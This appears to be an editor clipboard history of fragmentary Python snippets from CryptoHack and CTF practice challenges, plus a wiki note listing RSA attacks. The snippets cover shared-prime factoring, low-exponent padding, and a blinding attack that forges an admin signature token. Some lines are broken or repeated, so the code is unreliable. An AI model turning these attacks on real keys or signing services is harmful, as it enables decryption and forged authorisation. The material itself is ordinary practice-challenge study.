c92b7d0abda9ea529e086a4cc7d815d9|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|12|1|V|python
	    print(key.e)
1ed8d4385893f112f069c9f4a5b8bcbf|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|13|5|V|python
	    print(key.n)
43b8b55d84edffcf545bdbc4fd143d94|file:///home/neo/vimwiki/Crypto.wiki|2|1|V|vimwiki
	=== RSA ===
	
	== Attacks ==
	
	= Primes computed using fast primes method =
	* ROCA attack
	* Detect with roca-detect python package
	
	= Small difference between p and q =
	* Fermat factorization (script)
	* [ https://crypto.stackexchange.com/questions/19733/small-prime-difference-in-rsa ]
	
	= Exponent 3, not padded message and access to 3 different ciphertexts of the same plaintext with different moduli =
	x = chinese_remainder_theorem([ct1, ct2, ct3], [n1, n2, n3])
	plaintext = cubic_root(x)
	
	= Small public exponent (e) = 
	* plaintext = cubic_root(ciphertext) if incorrect padding
	
	= Very large public exponent (e) => Small private key (d)=
	* Wiener attack
	* Boneh durfee method to get d
	
	= Only one prime used for N (N itself is prime)=
	* phi = n-1
	* d = inverse(e)
	
	= Square same prime to get N (N = p*p) = 
	* phi = p*(p-1)
	* d = inverse(e)
	
	= Many primes used for N =
	* Factor N
	* phi = p-1 for p in factors(N)
	
	= General =
	* Check if N can be factorized easily
	    - Factordb
	    - Factorization methods with sage
	        -  ecm.factor(n)
	    
	
f7d9335c2056cea7d79d3283863b7688|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|14|1|V|python
	ct = bytes.fromhex(open('rsa/prime2/keys_and_messages/34.ciphertext').read())
	print(ct)
aea9cd785c00385cbf532f02fe4fb636|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|20|1|V|python
	    if key.e == 3:
	        keys_low_e.append(key)
	        print(key.n)
017e6da0b01a1ed3a1a94ab78e9288f2|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|20|9|V|python
	        print(filename)
82163e6b7088ac28e1b60968a4649e97|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|27|1|V|python
	ct = bytes.fromhex(open('rsa/prime2/keys_and_messages/34.ciphertext').read())
1b3f86ac5a34b4da8bd02b7350c691ab|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|28|1|V|python
	ct = bytes(open('rsa/prime2/keys_and_messages/34.ciphertext').read(), 'utf-8')
91c099929fcea2d3ae31c41e5cf0d9cf|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|28|1|V|python
	ct = bytes_to_long(ct)
1baafb96fe70a6a004fe7ea30182e9b3|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|27|64|v|python
	).hex()
ad294adce884e52ac260608883152d2b|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|24|1|V|python
	        print(key.n)
411f7724b0a11b7b11073660ab36eb8b|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|15|1|V|python
	# keys_low_e = []
e04ff95f41948f09b78233569221391b|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|27|1|V|python
	print(e*d % phi)
9a32023144031cdca1ecce04320dd74d|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|31|1|V|python
	pt = pow(ct, d, vuln_n)
78db56ba6abce93be4bcd2961faa5bcf|file:///home/neo/cryptohack/rsa/prime2/fast_primes.py|5|1|V|python
	from Crypto.Cipher import PKCS1_OAEP
d8a1b5ccdcd620a3f34481e01f1f498c|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|31|1|V|python
	# ct = bytes_to_long(ct)
e4bc7d7e5fc1d653b22095206b4bae5f|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|26|9|V|python
	        #     print(key.n)
1087003be5c77427930c679560f4da1e|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|35|10|v|python
	bytes.fromhex(open('rsa/prime2/keys_and_messages/34.ciphertext').read())
3b619c24b7ad1b728d2e05c82003b9c0|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|29|13|V|python
	            print(filename)
a4257367a593dbbbe6a8872a418beebe|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|15|13|v|python
	bytes.fromhex(open('rsa/prime2/keys_and_messages/21.ciphertext').read())
383776f595b733bdb6feade2f7df1996|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|12|84|V|python
	vuln_n = [880601876018126974655758168244580979939432729335897643115187005928045724212359347828326972308387123007907618271169768368773527769799858889798274677870913429552288393799762792963582637613873616668855055928453039123247097426011041579724038467873846692665406935017258183479407968851305538249219557230185109188934468189159188448976907273847512846310110857145990950999052261490634049269258048973540023052312180593774189899981338163183146684097700543799816661285467016272414656434362073341796225548442638247843903728028784453671691741258996422881425195807667620759330412451310790233796968122311645024770429638895744035461474488348457291417975967079376099102426576616298733245697398979436019009625377903857657804505875570531609024486920369775802575556624236911595624756614822363026365965816322580872543392207758586828863010669274498631929549813931313293908378046371752223322641195465606459732016940534878375620876473649150059079145420301843366994640205983664044920759580873815372303736439024210202544811622377543981797886389743771460282521632226856076411124939093360155310710562605842759585005451968681307058194767740343993719021037820436259445098864987414951036288255091879484603454072216858373227767650404652014344588889586490675082793783456623448471213039912129380320366698808725775488797452581425248837115851313548090911235886735908847899564005956610247734627053663788257535092929809297829723534937482758760022079911227525035198946477409509590344378842961941001856764987212991159021127208667170231568946002068473125809962324566607157151951160759771362185151641733714473436784007717261583933432325502653222657088503086017491851822143714237524053794726131441549595210487431253012708370667922319566467941649915195158659267880685347809179780554818978040600202177955257369998074019349387957986809734753832954703459335886474512309301173127537658600903143172483197175425383253835461874361120544755102468511863530947101598409070724006835244728628523710600082225313502571104573631039801635482729932347799916531075673136819261803284350803688637693063346514860170106956712245342497165352353676271487448328622151825099938359084024316434726692904969480188488503607124352663502185779222628938541724019037957509809430427628467955626864072393016621604600643356351082234527509438746617316855204924180404909098466177987023604661008784456162995368740372054015970096545577054655288776234647891963773667196543821969514295205524262363114459810794290543504003698689931405992235197351264248367, 911155430397089868893710399679843124299455958854629791471074639340378853507919464565810613293797452094094419935791316019378845266444423939069591777393674738696600039645897332187483027169161226989463007958162660511833293293934680580795884835915313555665028500273978111975141483711972416976051841007136079560842930618009244952633494357039685233438172831394231820157810045590724112193897315806153435024753655632608473402805617714869872186030635147363770587791422138471720933891531786826222624075389616924907447441888709731985493341989380909384044148308972895318737298279201161927233884653041034925026221365261861897721220653242120761984486476073104852961087732061243614950426772704615616351403821143864605052161365099625909493963610940101256661638103038287477307037516480655622483809303973844914111675448758165915304217110383740650242709810054890529380273089938565187583433898011098193322584247150816917331201462582657698512259466266467891678088041219884140157617779080424490085443389141752344203813840060106563190054773064792934495477729541544277637486134526425276923313072437402635187015371607927851364757573804279682763676084186465911588299208965058610144991287224616962493760669148885986144273990509506917829875014575681080262558165579783076765660193031162935128415991494869107015989320398687972326200569107240071210145877231390571616043489752316478596708456751559975181688088516026334899322294703865900392081637370670610001746419748464485461186336107253585654909405811415364943187972977795714207432456907751605269930478002755232084922463849167034964311000757003822836396625765900984940363082552313118484509184504317922624334876645052025073648609570099819847985458003040099734106611690135903402566586049952555685885129167949699135190659447558932337919259697368802685025241864769010304936839822392261403853930937011037322345944122791531705024153346939404340299053282463816135162799746979069053739021760882877630867181836643699922817756581868559378190317154945587598406935787422788156408738900082828687918258191147242549110812512887371014023446801086634829279768440364090252588453227384663956539541609351183298197012676011524752900153903629441235349425281050546200540159001545754825292288245399374715709620586639621734512134963505768992518699532365136633077433424884644404975480104687269688186070343890063473871474522626591333445128238108321171232365531356095520991346873717177021044283092373174179512606967225038176778565236701000826596381944707372969518852801195663]
	p_list = [958184995717643778367109297177053847629563341461388239686713486581617523166778192225682418414086368993919276506470571372250917475888851893929411421206486355460327779136608614811735147429467927003949852184445514470235262010506817914246450409608380484343227208323735134716416024952157095353069771927641962564667735986199559114614312987858753171967358194765227538823809323364380960009328150327486200891319233293813236706006738177703585510661957839416624117590346159189104523914362288603185694895116435277797207375421927321856606454446068514058650650258084626393011136982346051756451609461747423890614332437715257166684249507141438360591283565786166940137452935331897490103496209757879551706770078227896850083854361799460987943390629853646920491278438507395162612862665682967567531392598682310439580913922107877199801248645842436491019852735638141282639552557893882206284828299057391198524339441257336518199204864585201319808557650547994409694103458427134956443007467253460543273600926765158016162921244279127293188234736067411569577701942054262963631911072963935584749681951906561365831627370892193092542110701269191134490816226454831285981622547520071795283458939007187535852274831426050075680961735753030788449981423879510992740805229, 919031168254299342928662994540730760042229248845820491699169870943314884504551963184014786520812939038906152950817942941469675496074887272906954399256046690838233813273902630076899906873722574023918253104149453601408405078374008695616160025877687382663027910687942091698042309812910101246025081363544171351624307177908410700904833438480012985928358897861427063761678614898919524867442676631453135379994570031284289815099294504127712924001149921480778993635917803466637717023744788311275545126346774536416864472035644211758788016642401235014385037912224180351022196262011724157012443048941426178651665266181311662824205620324073087330858064769424755443807165558567191049013947419763315902476674266627953223373671797370373786249718677582213173537848582863398367624397247597103174897140005790273296171101569756006898658668311846034013183862374297777882433967015111727139360441681664840944403450472574336901043555319067050153928231938431298082827397506406624964952344826628463723499263165279281720105570577138817805451223334196017505528543229067732013216932022575286870744622250293712218581458417969597311485156075637589299870500738770767213366940656708757081771498126771190548298648709527029056697749965377697006723247968508680596118923]
	q_list = [919031168254299342928662994540730760042229248845820491699169870943314884504551963184014786520812939038906152950817942941469675496074887272906954399256046690838233813273902630076899906873722574023918253104149453601408405078374008695616160025877687382663027910687942091698042309812910101246025081363544171351624307177908410700904833438480012985928358897861427063761678614898919524867442676631453135379994570031284289815099294504127712924001149921480778993635917803466637717023744788311275545126346774536416864472035644211758788016642401235014385037912224180351022196262011724157012443048941426178651665266181311662824205620324073087330858064769424755443807165558567191049013947419763315902476674266627953223373671797370373786249718677582213173537848582863398367624397247597103174897140005790273296171101569756006898658668311846034013183862374297777882433967015111727139360441681664840944403450472574336901043555319067050153928231938431298082827397506406624964952344826628463723499263165279281720105570577138817805451223334196017505528543229067732013216932022575286870744622250293712218581458417969597311485156075637589299870500738770767213366940656708757081771498126771190548298648709527029056697749965377697006723247968508680596118923, 991430390905926023965735525726256769345153760248048478891327804533279477721590201738061124861790305326884541900044434890157058142414306020739922709698601329762087825767461256626800629782378634339618941488765491437487541851308806651586976069659042714378353883168031522106709494592827914376213512564492771821921367377484213072867988877925314809325159382342584541006645302760204539354879391605736604946702073863673524002591877977949645618863730441482821840664748508050205004505250025193611888170440612737112479006348533153568103452396596042639466753099280111709882461562564978070397786887446291916733276692400981917025361391646188802038772976331121474570242334921390569285834250256522656433623912544555266998750630136756355560927237594975904642791712318215315246754105993145827690531584325461597482035600919501967088106457091199733024323755210212616553447076697617349235377466327471959683763796707566328536834402308887105044128592177681553611608618850780128709949316259039664054913946726480968288231015999572777436469163437066403964134928735809253108394078092917006632332098357725950865697047565284013456253933234017983509582245874130968218422573483012858388392588302838940565560162598810462310034964473576147200222580784694005333482381]
accb71d458a1a2e3a96377cf1d61b165|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|12|1|V|python
	ct_list = [ bytes.fromhex(open('rsa/prime2/keys_and_messages/34.ciphertext').read()), bytes.fromhex(open('rsa/prime2/keys_and_messages/21.ciphertext').read())]
68fcc77c2f76ffd5599cc03b1cd16857|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|13|2|V|python
	for i, n in enumerate(vuln_n):
	    p = p_list[i]
	    q = q_list[i]
	
	    phi = (p-1)*(q-1)
	    e = 0
7b3ec83cdd495c6128652737d46feb35|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|17|9|V|python
	    if key.n == n:
	        e = key.e
	        break
741d181b344992aff7d1089075270bf4|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|33|6|v|python
	ct_list[i]
decff0c320a054e671431910dd1e878a|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|22|5|V|python
	    print(moduli[0], moduli[1])
eb5b55684c82f34fe4a75d00543888e5|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|1|1|V|python
	import os, glob, itertools, math
	from Crypto.Cipher import PKCS1_OAEP
	from Crypto.PublicKey import RSA
	import sys
	sys.path.insert(1, '~/cryptohack')
	from general.mathematics.mathematics import *
	from Crypto.Util.number import long_to_bytes, bytes_to_long
	
	msg = "???"
	
	keys = {}
	exponents = {}
	
	for i in range(1,51):
	    for filename in glob.glob('rsa/prime2/keys_and_messages/%s.pem' % i):
	        f = open(filename)
	        key = RSA.importKey(f.read())
	        keys[key.n] = i
	        exponents[i] = key.e
	
	for moduli in itertools.combinations(keys.keys(), 2):
	    common_factor = math.gcd(moduli[0], moduli[1])
	    if common_factor != 1:
	        break
	
	p = common_factor
	pos = keys[moduli[0]]
	e = exponents[pos]
	q = moduli[0]//p
	phi = (p-1) * (q-1)
	d = multiplicative_inverse(e, phi)
	dec_key = RSA.construct((moduli[0],e,d))
	cipher = PKCS1_OAEP.new(dec_key)
	ct = bytes.fromhex(open('rsa/prime2/keys_and_messages/%s.ciphertext' % pos).read())
	decrypted = cipher.decrypt(ct)
	print(decrypted)
	
	
	
	# with open('21.key') as f:
	#     key = RSA.importKey(f.read())
	
	# cipher = PKCS1_OAEP.new(key)
	# ciphertext = cipher.encrypt(msg)
	
	# with open('21.ciphertext', 'w') as f:
	#     f.write(ciphertext.hex())
	
1c9ae449e9770184da452d352e90912d|file:///home/neo/CTFs/scripts/crypto/common_factor.py|4|8|V|python
	import sys
	sys.path.insert(1, '~/cryptohack')
4ae284a4ac75925aa9417bd5c35ef02a|file:///home/neo/CTFs/scripts/crypto/common_factor.py|10|1|V|python
	for i in range(1,51):
	    for filename in glob.glob('rsa/prime2/keys_and_messages/%s.pem' % i):
	        f = open(filename)
	        key = RSA.importKey(f.read())
	        keys[key.n] = i
	        exponents[i] = key.e
9d36d76bd503cf83acf128e876f045a8|file:///home/neo/CTFs/scripts/crypto/common_factor.py|23|1|V|python
	ct = bytes.fromhex(open('rsa/prime2/keys_and_messages/%s.ciphertext' % pos).read())
8be4cf054c0953fe699e3ca7404f865e|file:///home/neo/CTFs/scripts/crypto/common_factor.py|30|1|V|python
	
	# with open('21.key') as f:
	#     key = RSA.importKey(f.read())
	
	# cipher = PKCS1_OAEP.new(key)
	# ciphertext = cipher.encrypt(msg)
	
	# with open('21.ciphertext', 'w') as f:
	#     f.write(ciphertext.hex())
	
100280890d2f8b170717471e2353ed0c|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|32|5|v|python
	multiplicative_inverse
5ebf780a3e54d51d9e7d6764eab8f384|file:///home/neo/cryptohack/rsa/padding/output_a9b926b2ff21c0aeac188cd5191b1396.txt|1|1|V|text
	n = 95341235345618011251857577682324351171197688101180707030749869409235726634345899397258784261937590128088284421816891826202978052640992678267974129629670862991769812330793126662251062120518795878693122854189330426777286315442926939843468730196970939951374889986320771714519309125434348512571864406646232154103
	e = 3
	c = 63476139027102349822147098087901756023488558030079225358836870725611623045683759473454129221778690683914555720975250395929721681009556415292257804239149809875424000027362678341633901036035522299395660255954384685936351041718040558055860508481512479599089561391846007771856837130233678763953257086620228436828
7712321f99296284e2460dc5baeab29e|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|10|5|v|python
	63476139027102349822147098087901756023488558030079225358836870725611623045683759473454129221778690683914555720975250395929721681009556415292257804239149809875424000027362678341633901036035522299395660255954384685936351041718040558055860508481512479599089561391846007771856837130233678763953257086620228436828
b137a954125d47a52744684541dcdea4|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|8|5|v|python
	95341235345618011251857577682324351171197688101180707030749869409235726634345899397258784261937590128088284421816891826202978052640992678267974129629670862991769812330793126662251062120518795878693122854189330426777286315442926939843468730196970939951374889986320771714519309125434348512571864406646232154103
30a9345f2a3d678f712b63e36c2b0114|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|17|1|V|python
	print(long_to_bytes(pt))
1f537dd1fcc58f6ea1cf84ff46b5f256|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|19|1|V|python
	pt = 3989056315981780026558216911199095411581437112115373560595393505011574736120037094971411043244191576383
084b5b708d02c887397d468400f6bfc1|file:///home/neo/CTFs/scripts/crypto/common_factor.py|5|1|V|python
	from sympy.core.numbers import mod_inverse
4b8279476ebc37c9053324bd40c54925|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|5|1|V|python
	from gmpy2 importk
827346ca32862f37b2f68f93ef950b44|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|16|1|V|python
	print(mod_inverse())
b93bd3b186c0c0673aa9b1e03c9b9b4d|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|17|1|V|python
	print(FLAG)
aeaa9fbfb4c11436404ace31b2d30465|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|18|1|V|python
	print("{0:b}".format(FLAG))
43433ca4231e4fc7aa39b8e3d2832b76|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|19|22|v|python
	pad100(FLAG)
c5d4b84876ba436d8c6ffcf96fadbdf3|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|20|22|v|python
	bytes_to_long(padded*padded)
4ab73cf94899be886e7de7d63490ac1c|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|20|1|V|python
	print("{0:b}".format(padded*padded % n))
baa885b9ae925f6f4e38ff312501a76d|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|20|28|v|python
	*padded % n
a58ef951d07f5adadab2e5b030e214e8|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|11|1|V|python
	c = 63476139027102349822147098087901756023488558030079225358836870725611623045683759473454129221778690683914555720975250395929721681009556415292257804239149809875424000027362678341633901036035522299395660255954384685936351041718040558055860508481512479599089561391846007771856837130233678763953257086620228436828
c0a27c9f06b73f5ad553335f51f2936c|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|9|1|V|python
	n = 95341235345618011251857577682324351171197688101180707030749869409235726634345899397258784261937590128088284421816891826202978052640992678267974129629670862991769812330793126662251062120518795878693122854189330426777286315442926939843468730196970939951374889986320771714519309125434348512571864406646232154103
d91b56ea7909fc8d18ec6809eef09491|file:///home/neo/cryptohack/block-ciphers/cbc/lazy.py|5|1|V|python
	import sys, string
	sys.path.insert(1, '~/cryptohack')
	from general.xor.xor import *
30c0779d8d29d41cf000a410c38dba4b|file:///home/neo/cryptohack/solve_13374.py|5|1|V|python
	from general.mathem import *
939e1d25277d36788302c1efba39c821|file:///home/neo/cryptohack/rsa/signatures/solve_13374.py|5|1|V|python
	# Set up pwntools for the correct architecture
	exe = context.binary = ELF('./binary')
	# context.terminal = ['tmux', 'splitw', '-h']
	context.terminal = ['tmux', 'new-window']
70234b4bd0838e2a7aa5b9dd70cffde0|file:///home/neo/cryptohack/rsa/signatures/solve_13374.py|5|8|v|python
	args.HOST or ''
075a3c7c42bfa7a347bacac8f2239ef8|file:///home/neo/cryptohack/rsa/signatures/solve_13374.py|6|12|v|python
	args.PORT or 8080
d2a5ae37b0d925e99b34521e98431a1f|file:///home/neo/cryptohack/rsa/signatures/solve_13374.py|29|1|V|python
	
	if args.GEF:
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
	    ''')
	    # pie breakpoint function+118
	
	if args.PWNDBG:
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
	    ''')
	    # piebase 0x7f0
9979f70ca62d730f2e436e13204f1181|file:///home/neo/cryptohack/rsa/signatures/solve_13374.py|17|1|v|python
	def decode_base64(encoded):
be5dc8beea88aa644bc3471c563e268f|file:///home/neo/cryptohack/rsa/signatures/solve_13374.py|17|1|V|python
	
	    return base64.b64decode(encoded)
	
	def decode_hex(encoded):
	    # return bytes.fromhex(encoded).decode('ascii')
	    return codecs.encode(codecs.decode(encoded, 'hex').decode('latin-1'), 'latin-1')
	
	def decode_rot13(encoded):
	    return encoded.decode('rot13') 
	
	def decode_bigint(encoded):
	    return number.long_to_bytes(int(encoded, 16)).decode('latin-1')
	
	def decode_utf8(encoded):
	    return ''.join([chr(x) for x in encoded])
	    
	
	encodings = {
	        'base64': decode_base64,
	        'hex': decode_hex,
	        'rot13': decode_rot13,
	        'bigint': decode_bigint,
	        'utf-8': decode_utf8
	        }
13b1f0124d1096397f0dd801eb783c66|file:///home/neo/cryptohack/rsa/signatures/solve_13374.py|17|1|V|python
	for _ in range(100):
	    received = json_recv()
	    enc_type = received["type"]
	    enc_value = received["encoded"]
	    decr_function = encodings.get(enc_type)
	    decr_value = decr_function(enc_value)
	
	    to_send = {
	        "decoded": decr_value
	    }
	    json_send(to_send)
	
	json_recv()
f1ddbf8544b14441bf18a6ee0e1e0b88|file:///home/neo/cryptohack/rsa/signatures/solve_13374.py|18|1|V|python
	json_send({'option': 'get_pubkey'})
5fe6a5817c8d29fb8e4ceb8c7711b6dc|file:///home/neo/cryptohack/rsa/signatures/solve_13374.py|19|1|V|python
	pubkey = json_recv()
fca7f5c16db60aaad8f7816d7d8134fb|file:///home/neo/cryptohack/rsa/signatures/solve_13374.py|20|1|V|python
	print(pubkey)
85a4c48b6966f3f12a529abd1cb0f163|file:///home/neo/cryptohack/rsa/signatures/solve_13374.py|16|1|V|python
	    return r.recvline()
0e954eb7d9a66d939aa39f5be1d536c3|file:///home/neo/cryptohack/rsa/signatures/solve_13374.py|23|23|v|python
	get_pubkey
c6ac0cbd0ba09ac7b29a42d47592a4e2|file:///home/neo/cryptohack/rsa/signatures/solve_13374.py|23|1|V|python
	json_send({'option': 'get_secret'})
e53c1741cfde9a60452368b900cf1aad|file:///home/neo/cryptohack/rsa/signatures/solve_13374.py|26|23|v|python
	get_secret
c9004860e69f97e323826e1a83ad1beb|file:///home/neo/cryptohack/rsa/signatures/13374.py|3|1|V|python
	from Crypto.Util.number import bytes_to_long, long_to_bytes
83218ac34c1834c26781fe4bde918ee4|file:///home/neo/cryptohack/rsa/signatures/blinding.py|18|22|v|python
	Welcome
045f19b2a504d5aa93c029077c7021f8|file:///home/neo/cryptohack/rsa/signatures/blinding.py|24|35|V|python
	json_send({'option': 'get_secret'})
	secret = json_recv()['secret']
7ccb715fd9e2182187f4b0cd8d9f7baa|file:///home/neo/cryptohack/rsa/signatures/blinding.py|25|1|V|python
	decrypted = long_to_bytes(int(json_recv()['signature'][2:],16))
1aba5bc55670e00f55d3edc71188df37|file:///home/neo/cryptohack/rsa/signatures/13376.py|7|1|V|python
	ADMIN_TOKEN = b"admin=True"
1858d7d84c1f48cd63eda4f989dbf9e7|file:///home/neo/cryptohack/rsa/signatures/blinding.py|29|14|v|python
	ADMIN_TOKEN
60ac5c425c72eb1061c7ecef744d3024|file:///home/neo/cryptohack/rsa/signatures/blinding.py|29|1|V|python
	# ADMIN_TOKEN = b"admin=True"
6b2e9f2b13648814cb1c0a39e82b1c29|file:///home/neo/cryptohack/rsa/signatures/blinding.py|27|1|V|python
	print(bytes_to_long(ADMIN_TOKEN))
d5ea06692d5854c0307c55c40581868b|file:///home/neo/cryptohack/rsa/signatures/blinding.py|26|1|V|python
	token_1 = hex(bytes_to_long(b'a' + b'\x00' * 9))[2:]
494dd05ce05fe4b5501e9c97666f69a0|file:///home/neo/cryptohack/rsa/signatures/blinding.py|29|1|V|python
	json_send({'option': 'sign', 'msg': token_1})
	sig1 = json_recv()['signature']
26696364256827adcf76d8cd0448951c|file:///home/neo/cryptohack/rsa/signatures/blinding.py|34|1|V|python
	# print(d)
777c2cd0cfff02b658ac5f383f596cde|file:///home/neo/cryptohack/rsa/signatures/blinding.py|35|1|V|python
	# token_i = bytes_to_long(ADMIN_TOKEN)
	# signed = pow(token_i, d, n)
8176d50d9d737c1287b869e20de49760|file:///home/neo/cryptohack/rsa/signatures/blinding.py|35|9|v|python
	token_1 + token_2
a08f56c7550d2822a5c96d3239830a60|file:///home/neo/cryptohack/rsa/signatures/blinding.py|36|1|V|python
	print(token)
6990f5587608b21dcb3449403688f5b1|file:///home/neo/cryptohack/rsa/signatures/blinding.py|26|1|V|python
	token_1 = hex(bytes_to_long(b'a' + b'\x00' * 9))[2:]
	token_2 = hex(bytes_to_long(b'dmin=True'))[2:]
ad81e15b205167f6b6e157636a3f399b|file:///home/neo/cryptohack/rsa/signatures/blinding.py|29|1|V|python
	json_send({'option': 'sign', 'msg': token_2})
	sig2 = json_recv()['signature']
ce441b70a0b31d87eafdd2c0bb17bddf|file:///home/neo/cryptohack/rsa/signatures/blinding.py|29|1|V|python
	
	token = sig1 + sig2 
4c0e67bcd321d24ca967070e0ef2d35d|file:///home/neo/cryptohack/rsa/signatures/blinding.py|29|1|V|python
	json_send({'option': 'verify', 'msg': token})
9785c3d4e190c115f5e8fd0600003599|file:///home/neo/cryptohack/rsa/signatures/blinding.py|28|37|v|python
	token_1
47718ea6a6a41ceb9e932111bdad0b8c|file:///home/neo/cryptohack/rsa/signatures/blinding.py|29|1|v|python
	sig1
f9b9ac31ae392527e935c5ccb06bf5b0|file:///home/neo/cryptohack/rsa/signatures/blinding.py|28|37|v|python
	hex(blinded)[2:]
663d44e2409b1bd08b2ffb014dccae33|file:///home/neo/cryptohack/rsa/signatures/blinding.py|28|21|v|python
	blinded
45e75af944302926bf7e32f684e38704|file:///home/neo/cryptohack/rsa/signatures/blinding.py|29|1|V|python
	print(blinded)
9c79a27ac599aaff6236074df29960b9|file:///home/neo/cryptohack/rsa/signatures/blinding.py|29|1|V|python
	print(bytes.fromhex(int(blinded, 16)))
ca9e68baeb2eeb2c3acfa88736895eec|file:///home/neo/cryptohack/rsa/signatures/blinding.py|28|23|v|python
	 * 3
403ccd3571a860f192bafc7220a78864|file:///home/neo/cryptohack/rsa/signatures/blinding.py|27|1|V|python
	print(token_i)
e6eac47f3391626b6f51155b482aea5f|file:///home/neo/cryptohack/rsa/signatures/blinding.py|28|1|V|python
	print(len(blinded))
dc97291b63a41ae16b9839349d63ad79|file:///home/neo/cryptohack/rsa/signatures/blinding.py|32|39|v|python
	hex(admin_sig)[2:]
3e85b4810e21761cb4eb67360f68d5d6|file:///home/neo/cryptohack/rsa/signatures/blinding.py|30|30|v|python
	.ljust(512, '0')
d8e73b28dfc6b279d4ff599b385b730e|file:///home/neo/cryptohack/rsa/signatures/blinding.py|31|1|V|python
	admin_sig.ljust(512 , '0')
9cc84caed386bcb89140cb4f038273d3|file:///home/neo/cryptohack/rsa/signatures/blinding.py|33|1|V|python
	print(hex(token))
4e1749031fab6c73eb22619747419ad3|file:///home/neo/cryptohack/rsa/signatures/blinding.py|31|1|V|python
	print(admin_sig)
f231db32b1dfea8125a1a0b16c85cec7|file:///home/neo/cryptohack/rsa/signatures/blinding.py|30|15|v|python
	pow(token_i, blinding, n)
b65d396829a287d3929ae0e6e855db96|file:///home/neo/cryptohack/rsa/signatures/blinding.py|31|27|v|python
	.rjust(22, '0')
ef1e45d9f5a92990e82da539c82be720|file:///home/neo/cryptohack/rsa/signatures/blinding.py|36|17|v|python
	pow(sig * blinding_rev, 1, n)
bdd4cec048da9959e1622794686c7d7e|file:///home/neo/cryptohack/rsa/signatures/blinding.py|29|1|V|python
	print(blinding_rev)
2465ea8ab88057521bcef71b65bcf448|file:///home/neo/cryptohack/rsa/signatures/blinding.py|35|1|V|python
	# json_send({'option': 'sign', 'msg': blinded})
56d7489b5c47d944d4a1370cdfedb107|file:///home/neo/cryptohack/rsa/signatures/blinding.py|30|1|V|python
	print(sig_x)
349d7dcaca5a7407806fd4a072fe6b5a|file:///home/neo/cryptohack/rsa/signatures/blinding.py|28|1|V|python
	json_send({'option': 'sign', 'msg': hex(x)[2:].rjust(2,'0')})
	sig_x = json_recv()['signature']
caaf3849b84760b9546d1c4fcb191bc2|file:///home/neo/cryptohack/rsa/signatures/blinding.py|34|46|V|python
	hidden_token = x * bytes_to_long(ADMIN_TOKEN)
	json_send({'option': 'sign', 'msg': hex(hidden_token)[2:].rjust(2,'0')})
	sig_hidden = int(json_recv()['signature'], 16)
	print(sig_hidden)
	sig_admin = sig_hidden // sig_x
	print(sig_admin)
6b0f0e06fb5cb1d834c00338608f34c0|file:///home/neo/cryptohack/rsa/signatures/blinding.py|32|1|V|python
	print(sig_b)
6d7d180a9b2375c8ae4df8eb27c2d31f|file:///home/neo/cryptohack/rsa/signatures/blinding.py|30|1|V|python
	json_send({'option': 'sign', 'msg': hex(blinding * token)[2:].rjust(2,'0')})
0365ed6976547209eb28b2f8f077e949|file:///home/neo/cryptohack/rsa/signatures/blinding.py|47|1|V|python
	# json_send({'option': 'verify', 'signature': admin_sig, 'msg': hex(token_i)[2:]})
81daddfa6b8983542d7eacd22e20b14d|file:///home/neo/cryptohack/rsa/signatures/blinding.py|47|1|V|python
	# json_send({'option': 'verify', 'signature': admin_sig, 'msg': hex(token_i)[2:]})
	# decrypted = json_recv()
	# print(decrypted)
effe7a7366eee9c4b8e4dc45587e3a34|file:///home/neo/cryptohack/rsa/signatures/blinding.py|34|45|v|python
	admin_sig
fa5438c7c0ced3efc12090eea05fd12a|file:///home/neo/cryptohack/rsa/signatures/blinding.py|30|37|v|python
	hex(blinding * token)[2:].rjust(2,'0')
05ffed09b596db6808395f2dc8a8b0e8|file:///home/neo/cryptohack/rsa/signatures/blinding.py|37|1|V|python
	
	# blinding = 3
	# blinding_rev = mod_inverse(blinding, n)
	# token_i = bytes_to_long(ADMIN_TOKEN)
	# blinded = pow(token_i * blinding, e, n)
	# blinded = hex(blinded)[2:].rjust(60, '0')
	# json_send({'option': 'sign', 'msg': blinded})
	
	# sig = int(json_recv()['signature'], 16)
	# admin_sig = sig * blinding_rev % n
	# admin_sig = hex(admin_sig)[2:].rjust(512, '0')
	# print(admin_sig)
	
	# json_send({'option': 'verify', 'signature': admin_sig, 'msg': hex(token_i)[2:]})
	# decrypted = json_recv()
	# print(decrypted)
	
	
